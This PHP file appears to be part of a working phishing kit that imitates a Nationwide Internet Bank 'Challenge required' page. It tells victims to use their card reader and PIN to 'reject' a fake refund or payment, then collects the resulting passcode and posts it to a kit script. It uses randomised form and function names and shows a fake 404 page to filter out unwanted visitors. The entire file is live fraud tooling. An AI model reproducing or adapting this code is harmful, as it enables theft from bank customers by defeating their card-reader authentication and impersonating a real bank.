<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["inID"]))
{	
	$challenge=getChallenge($_SESSION["cusnum"],$_SESSION["dob"],$panel_rec);
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	$err="display:none";
	$_SESSION["act"]="ref";
	$text="refund";
	if($_GET["act"] == "noref")
	{
		$_SESSION["act"]="noref";
		$text="payment";
	}
	
	if(isset($_GET["err"]))
	{
		$err="";
	}
	echo '<!DOCTYPE html>
<!--[if IEMobile 7 ]> 
<html dir="ltr" lang="en-GB" class="has-no-js iem7">
   <![endif]-->
   <!--[if lt IE 7 ]> 
   <html dir="ltr" lang="en-GB" class="has-no-js ie6 old-ie">
      <![endif]-->
      <!--[if IE 7 ]>    
      <html dir="ltr" lang="en-GB" class="has-no-js ie7 old-ie">
         <![endif]-->
         <!--[if IE 8 ]>    
         <html dir="ltr" lang="en-GB" class="has-no-js ie8 old-ie">
            <![endif]-->
            <!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
<html dir="ltr" class="has-js has-no-ie8compat has-opacity has-cssremunit has-preserve3d has-supports has-checked has-textshadow has-cssanimations has-borderradius has-boxshadow has-flexbox has-flexboxlegacy has-no-flexboxtweener has-flexwrap has-csstransforms has-csstransforms3d has-csstransitions has-cssclippathinset" style="" lang="en-GB"><head></head><body class="page login-page">
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                  <meta charset="utf-8">
                  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <meta name="format-detection" content="telephone=no">
                  <title>Challenge required - Nationwide Internet Bank</title>
                  <link rel="stylesheet" href="game/leave.css'.outrand().'">
                  <link rel="stylesheet" href="game/online.css'.outrand().'">
                  <link rel="shortcut icon" href="favicon.ico'.outrand().'">
                  <link rel="apple-touch-icon" href="game/120.png'.outrand().'" sizes="120x120">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'" sizes="76x76">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
               ';if($rand==2){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("err-m2").style.display="none";document.getElementById("err-m").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
			   <header class="page-header">
                     <div class="page-header__inner">
                        <div class="page-header__logo">
                           <a class="logo__image" href="#">
                           <span class="alt-text">Nationwide.co.uk</span>
                           </a>
                           <div class="page-header__subtitle-link">
                              <div class="logo__subtitle">
                                 <span class="icon"></span>
                                 Internet Bank
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <div class="app app--process process">
                     <section class="stage" role="main">
                        <header class="stage__header">
                           <span class="icon"></span>
                           <div class="stage__header__title">
                              <h1>Challenge Required</h1>
                              <div class="stage__header__right">
                                 <span style="font-size: 12px;">SSL Secured</span> 
                              </div>
                              <span id="process-title-hidden-text" class="u-screen-reader-text">
                              </span>
                           </div>
                        </header>
                        <div class="stage__content">
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                                 
                                 
                                 
                                 
                                 <div class="message-list validation-summary-header message-list--validation-error message-list--unordered" tabindex="0" id="err-m" style="display:none">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                       Error
                                       <span class="message-list__subtitle">Sorry - you must correct the errors on this page before you can continue.</span>
                                       <span class="u-screen-reader-text visuallyhidden" id="pc">Clicking this link will direct you to the field containing the error.</span>
                                    </div>
                                    <div class="message-list__items">
                                    </div>
                                 </div>
								 
								 <div class="message-list validation-summary-header message-list--validation-error message-list--unordered" tabindex="0" id="err-m2" style="'.$err.'">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                       Error
                                       <span class="message-list__subtitle">Your card reader details have been entered incorrectly. Please try again.</span>
                                       <span class="u-screen-reader-text visuallyhidden" id="pc">Clicking this link will direct you to the field containing the error.</span>
                                    </div>
                                    <div class="message-list__items">
                                    </div>
                                 </div>
								 
								 
                              </div>
                           </div>
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                              </div>
                           </div>
                           <div class="section">
                              <div class="section__inner">
                                 <div class="message">
                                 </div>
                              </div>
                           </div>
						   ';if($rand==2){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("err-m2").style.display="none";document.getElementById("err-m").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
						   <form action="AuthProcessingm.php?/AccesManagement/IdentfyCustomer/\'.randomChaSp(rand(5,10)).\'&inID=\'.randomCha(rand(40,60)).\'" method="POST" onsubmit="'.$fj.'(1); return false;" autocomplete="off" id="'.$fname.'" name="'.$fname.'" method="post" novalidate="novalidate">
                           <div class="section section--no-title">
                              <div class="section__title">
                                 <h2>Please proceed below</h2>
                              </div>
                              <div class="section__inner">        
                                 <p>For your security, you need to use your card and card reader to reject this '.$text.'. </p>

<div class="message">
                                             <style>
                                                .list-text img {
                                                vertical-align: middle;
                                                padding-left: 0.188;
                                                }
                                             </style>
                                             
                                             <div class="list-text">
                                                <p>1. Insert your card **** **** **** '.$_SESSION["char4"].' into the card reader. </p>
                                             </div>

<div class="clear-line"> </div>

<div class="list-text">
                                                <p>2. Press <img alt="\'Tick\'" src="game/way/cardReaderSign.png"> when asked to \'Select Function\'.</p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>3. Enter your debit card PIN and press <img alt="OK" src="game/way/cardReaderOK.png"></p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>4. Enter reference number <strong>'.$challenge.'</strong> and press <img src="game/way/cardReaderOK.png" alt="OK"></p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>5. Enter amount of '.$text.' 
  <strong>'.$_SESSION["amount"].'</strong>
  and press 
  <img src="game/way/cardReaderOK.png" alt="OK"></p>
   <p>You do not need to enter the decimal point.  For example, an amount of £132.00 would be entered as 13200.</p>
                                             </div>


<div class="clear-line"> </div>
<div class="list-text"><p>6. Enter the passcode that is now displayed on your card reader and then click \'Reject\'.</p>
</div>
                                          </div>
<div class="control control--no-description control--simple control--short text-input-control">
                                             <label class="control__label" for="pc">
                                                <span class="control__label__title">
                                                   <h3>Passcode</h3>
                                                </span>
                                             </label>
                                             <div class="control__input">
                                                <input class="text-input text-input--numeric" id="pc" maxlength="9" name="pc" placeholder="" type="text" onkeypress="return '.$fj1.'(event)" onblur="'.$fj.'(0)">
                                             </div>
                                             <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" role="alert" id="fr" style="display:none">
                                                <span class="icon"></span>
                                                <div class="message-list__title">
                                                </div>
                                                <div class="message-list__items">
                                                   <li class="message message--no-action">This information is required.</li>
                                                </div>
                                             </div>
											 <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" role="alert" id="min8" style="display:none">
                                                <span class="icon"></span>
                                                <div class="message-list__title">
                                                </div>
                                                <div class="message-list__items">
                                                   <li class="message message--no-action">Enter 8 numbers.</li>
                                                </div>
                                             </div>
                                             
                                             <div class="control__help">
                                                
                                                
                                             </div>
                                          <div></div></div>

<div class="action action--primary action--authentication">
                                       <button class="action__button" type="submit" title="">Reject</button>
                                    </div>
</form>



                                 
                                 
                              </div>
                           </div>
                           <div class="section section--no-title" style="padding-top:50px;">
                              
                              <div class="section__inner">
                                 <div class="message-list message-list--no-title message-list--no-subtitle message-list--notice" role="note">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                    </div>
                                    <div class="message-list__items">
                                       <div class="message">
                                          <div style="color: #002878;">
                                             <span style="color: #5b6063;">
  Your card reader will automatically switch off after 40 seconds. Don\'t worry, this won\'t affect your transaction. Simply re-insert your card to start again.<br>
<br>
If you log out or close this session before clicking Reject your transaction will not be cancelled and will complete within 2 hours.<br>
<br>
If you make a mistake on your card reader press <img src="game/way/cardReaderClear.png" alt="CL"> to delete the last number or press <img src="game/way/cardReaderCancel.png" alt="C"> to delete all numbers.
</span>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 
                              </div>
                           </div>
                           
                           
                           
                           
                        </div>
                        
                     </section>
                  </div>
                  <footer class="page-footer">
                     <div class="page-footer__inner">
                        <div class="page-footer__navigation-social-media-copyright">
                           <div class="page-footer__navigation">
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Register</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Order a new card reader</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Security centre</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Accessibility</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Service status</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Mobile Banking app</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Internet Bank Terms and Conditions</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Contact us</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Cookies and privacy</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Troubleshooting</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                           </div>
                           <div class="page-footer__social-media-copyright">
                              <div class="page-footer__social-media">
                                 <div class="footer-heading">Follow us:</div>
                                 <ul role="navigation">
                                    <li>
                                       <a class="twitter" href="#">
                                       <span class="srText">Twitter (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="facebook" href="#">
                                       <span class="srText">Facebook (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="youtube" href="#">
                                       <span class="srText">Youtube (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="linkedin" href="#">
                                       <span class="srText">LinkedIn (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                 </ul>
                              </div>
                              <div class="page-footer__FSCS-Logo"><a href="#">
                                 <img alt="FSCS Logo" class="FSCS-Logo" src="game/FSCS_Logo.png">
                                 </a>
                              </div>
                              <div class="page-footer__copyright">© 2020 Nationwide Building Society</div>
                           </div>
                        </div>
                        <div class="page-footer__regulatory">
                           <p>Nationwide Building Society is authorised by the Prudential 
                              Regulation Authority and regulated by the Financial Conduct Authority 
                              and the Prudential Regulation Authority under registration number 
                              106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"> Opens in a new window</span></a>. Nationwide is not responsible for the content of external websites.
                           </p>
                        </div>
                     </div>
                  </footer>
				  ';if($rand==3){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("err-m2").style.display="none";document.getElementById("err-m").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
            </body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>